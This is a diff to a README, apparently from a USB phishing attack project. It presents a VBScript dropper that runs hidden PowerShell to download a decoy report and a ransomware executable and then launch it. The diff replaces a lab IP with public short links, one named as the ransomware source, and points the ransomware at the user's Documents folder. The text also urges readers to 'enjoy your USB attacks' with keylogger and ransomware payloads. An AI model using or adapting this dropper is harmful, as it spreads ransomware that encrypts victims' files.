@@ -293,15 +293,15 @@ Video of it in action: https://www.youtube.com/watch?v=ll4ojo6q-rM
 
 After testing alot, we loved the stealth this kind of attack gives, so we tried to apply this kind of USB attack with our other payloads such as [keylogger](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/keylogger) and [ransomware](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/ransomware)
 
-Just modify the .vbs file with the payload you want and enjoy your USB attacks! (remember to host the downloadable payloads in your attacker machines folder!)
-
-For example: Script that downloads the ransomware that executes in the TEMP folder + raport.txt.
+Just modify the .vbs file with the payload you want and enjoy your USB attacks! (remember to host the downloadable payloads in your attacker machines folder! (or replace the attacker IP with the source of the malware like https://tinyurl.com/36xacafn for example is the source of the ransomware)
+https://tinyurl.com/36xacafn
+Script that downloads the ransomware that executes in the TEMP folder + raport.txt.
 ```
 Set objShell = CreateObject("Wscript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 ' Download fake raport
-downloadRaport = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.3/raport.txt', '%TEMP%\raport.txt')"""
+downloadRaport = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/3va6t8n7', '%TEMP%\raport.txt')"""
 objShell.Run downloadRaport, 0, True
     WScript.Sleep 1000  ' Wait for 1 second
 
@@ -315,7 +315,7 @@ openRaport = "cmd /c start """" %TEMP%\raport.txt"
 objShell.Run openRaport, 0, True
 
 ' Download executable from attacker ip
-downloadCmd = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.3/encrypt.exe', '%TEMP%\encrypt.exe')"""
+downloadCmd = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/36xacafn', '%TEMP%\encrypt.exe')"""
 objShell.Run downloadCmd, 0, True
 WScript.Sleep 2000 ' Wait for 2 seconds initially (adjust this if needed)
 
@@ -325,7 +325,7 @@ Do While Not objFSO.FileExists(objShell.ExpandEnvironmentStrings("%TEMP%\encrypt
 Loop
 
 ' Start the exe in working directory defined below
-execCmd = "cmd /c powershell -WindowStyle Hidden -Command ""Start-Process \""%TEMP%\encrypt.exe\"" -WorkingDirectory \""%TEMP%\"""""
+execCmd = "cmd /c powershell -WindowStyle Hidden -Command ""Start-Process \""%TEMP%\encrypt.exe\"" -WorkingDirectory \""$env:UserProfile\Documents\"""""
 objShell.Run execCmd, 0, True
 
 Set objFSO = Nothing
